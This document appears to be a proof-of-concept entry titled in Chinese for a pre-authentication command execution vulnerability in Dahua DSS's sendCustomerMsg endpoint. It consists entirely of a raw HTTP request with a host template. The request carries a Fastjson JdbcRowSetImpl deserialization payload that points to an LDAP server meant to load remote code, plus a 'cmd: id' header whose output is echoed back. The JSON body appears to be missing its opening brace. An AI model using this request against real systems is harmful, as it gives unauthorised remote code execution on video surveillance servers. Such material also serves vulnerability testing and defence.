# 大华 DSS sendCustomerMsg 前台命令执行漏洞

    ```
POST /eventCenter/sendCustomerMsg HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.63 Safari/537.36
userCode: 123
cmd: id
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Type: application/json
Content-Length: 215

"a": {"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b": {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1389/TomcatBypass/TomcatEcho","autoCommit":true}}
```
